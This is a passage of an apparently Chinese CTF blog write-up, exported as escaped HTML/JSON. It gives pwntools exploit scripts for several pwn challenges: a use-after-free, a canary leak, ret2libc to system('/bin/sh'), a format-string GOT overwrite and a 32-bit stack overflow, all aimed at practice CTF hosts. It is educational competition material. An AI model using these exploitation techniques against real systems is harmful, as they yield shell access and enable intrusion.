class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(&#x27;node4.anna.nssctf.cn&#x27;,28732)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def add(size,name):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;size is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;ame is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\">#    sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def delete(index):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;Index :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">#    sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def show(idx):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;choice :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(&#x27;3&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">sh.recvuntil(&quot;oice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,&#x27;aaaaa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x20,&#x27;bbbbb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(0)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =p64(0x400B9C)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(0)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023奇怪的elf\"><a class=\"anchor\" href=\"#gdouctf-2023奇怪的elf\">#</a> [GDOUCTF 2023] 奇怪的 ELF</h5>\n<blockquote>\n<p>一个离谱的架构题目，两个文件一个是 x86_64 (arm64) 一个是 arm64 所以第二个因为环境原因无法运行，把 linux2 里面的 flag 转换为 16 进制然后在 python 进行一次异或运算即可得到 flag2</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=[</span><br><span class=\"line\">  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,</span><br><span class=\"line\">  0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB</span><br><span class=\"line\">]</span><br><span class=\"line\">for i in flag:</span><br><span class=\"line\">    print(chr(i^0x86),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023makewish\"><a class=\"anchor\" href=\"#hdctf-2023makewish\">#</a> [HDCTF 2023]Makewish</h5>\n<blockquote>\n<p>这个题目很有意思需要自己多次调试才能知道具体的解决办法综合了前面的很多知识点</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes #这里调用了一个伪随机数</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27; #日志</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(1) #srand</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">\tp=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">\t#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28492)</span><br><span class=\"line\">\tpayload=b&#x27;a&#x27;*(0x30-0x8)</span><br><span class=\"line\">\tp.sendline(payload)</span><br><span class=\"line\">\tp.recvuntil(payload)</span><br><span class=\"line\">\tcanary=u64(p.recv(8))-0x0a</span><br><span class=\"line\">\tlog.info(hex(canary))</span><br><span class=\"line\">\trand=libc.rand()%1000+324</span><br><span class=\"line\">\tp.sendafter(&#x27;key\\n&#x27;,p32(rand))</span><br><span class=\"line\">\tpayload=p64(0x4007C7)+p64(canary)</span><br><span class=\"line\">\tp.sendlineafter(&#x27;me&#x27;,payload)</span><br><span class=\"line\">\tp.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>利用 puts 得到 canary。</p>\n<h5 id=\"ciscn-2019华中pwn1\"><a class=\"anchor\" href=\"#ciscn-2019华中pwn1\">#</a> [CISCN 2019 华中] PWN1</h5>\n<p>常规 ret2libc 直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./CISCN_PWN1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28793)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">Padding = b&#x27;\\x00&#x27; + b&#x27;A&#x27; * (0x50 + 0x08 - 0x01)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">main = elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400C83</span><br><span class=\"line\">ret = 0x4006B9</span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\">Payload = Padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;Ciphertext\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:6].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;, addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr = addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">sh_addr = libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Payload_2 = Padding + p64(ret) + p64(rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload_2)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"moectf-2022babyfmt\"><a class=\"anchor\" href=\"#moectf-2022babyfmt\">#</a> [MoeCTF 2022]babyfmt</h5>\n<p>查看到这个题很简单的处理方法，里面有个 printf (buf) 可以直接判断为字符串溢出，没开 FULL，基本思路就是格式化字符串劫持 got 表，找到偏移之后试了几种修改，改发可以说是多种多样了。接收 backdoor 没啥用，可以改 got 表直接用 system 的 got 表就行，如果开 FULL RELRO 的话可以覆盖 ret 地址，给的地址还有点用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28523)</span><br><span class=\"line\">print_got=elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">p.recvuntil(&quot;\\n&quot;)</span><br><span class=\"line\">p.sendline(&quot;%10$s&quot;)</span><br><span class=\"line\">baskdoor=int(p.recv(9),16)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=fmtstr_payload(11,&#123;print_got:baskdoor&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"ciscn_2019_ne_5\"><a class=\"anchor\" href=\"#ciscn_2019_ne_5\">#</a> ciscn_2019_ne_5</h4>\n<blockquote>\n<p>注意 scanf 里面也给了 sh 和 system 直接打<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ciscn_2019_ne_5&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;node4.buuoj.cn&quot;,25421)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&quot;./ciscn_2019_ne_5&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&quot;password:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(b&quot;administrator&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def add(text):</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(b&quot;1&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;nfo:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\">def et():</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(b&quot;4&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+4)+p32(system)+b&#x27;\\x01\\x01\\x01\\x01&#x27;+p32(0x80482ea)</span><br><span class=\"line\"></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">et()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n",
            "tags": [
                "PWN"
            ]
        }
    ]
}